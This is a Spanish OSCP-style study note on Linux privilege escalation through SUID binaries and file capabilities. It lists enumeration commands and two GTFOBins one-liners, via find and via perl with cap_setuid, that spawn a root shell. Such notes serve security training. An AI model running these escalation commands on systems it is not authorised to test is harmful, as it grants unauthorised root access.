---
tipo: tecnica
fase: privesc
so: linux
tags: [oscp, tecnica, privesc, linux]
fecha: 2026-10-08
---

# SUID y Capabilities (Linux)

> [!abstract] Qué es y cuándo usarla
> Un binario con bit **SUID** se ejecuta con el UID efectivo de su propietario (normalmente root), no del user que lo lanza. Las **capabilities** dan permisos granulares a nivel de kernel a un binario concreto (ej. `cap_setuid`) sin necesidad de SUID completo. Si el binario con SUID/capability permite, directa o indirectamente, ejecutar comandos arbitrarios o leer/escribir ficheros privilegiados, se puede escalar a root. **GTFOBins** es la referencia para saber cómo abusar de cada binario conocido.

## Requisitos previos
- Ejecución de comandos como user sin privilegios.
- Localizar binarios SUID/capability: `find / -perm -u=s -type f 2>/dev/null` y `getcap -r / 2>/dev/null`.
- Consultar [gtfobins.github.io](https://gtfobins.github.io) por el nombre del binario encontrado.

## Pasos
```bash
find / -perm -u=s -type f 2>/dev/null       # binarios con SUID
find / -perm -g=s -type f 2>/dev/null       # binarios con SGID
/usr/sbin/getcap -r / 2>/dev/null             # binarios con capabilities (ej. cap_setuid+ep)
```
Ejemplos de abuso (sacados de GTFOBins, varían según el binario):
```bash
find /home/<user> -exec "/usr/bin/bash" -p \;                         # SUID sobre find
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'       # cap_setuid+ep sobre perl
```
Para comprobar el UID real vs efectivo de un proceso en marcha:
```bash
ps u -C <binario>
grep Uid /proc/<PID>/status       # Real / Effective / Saved / Filesystem UID
```

> [!warning] Detección / problemas
> - No todo binario con SUID/capability es explotable — depende de qué funcionalidad expone; comprobar siempre GTFOBins antes de asumir que hay vector.
> - `+ep` en `getcap` significa *effective* + *permitted*; sin ambos marcados la capability puede no estar realmente activa para el proceso.
> - El bit SUID se configura con `chmod u+s`; confirmarlo visualmente en `ls -l` por una `s` minúscula (ejecutable) o mayúscula (sin permiso de ejecución base).

## Visto en
- Módulo: [[18 - Linux Privilege Escalation]]
- Relacionado: [[Abusing Sudo (GTFOBins)]]
- Máquinas: [[]]
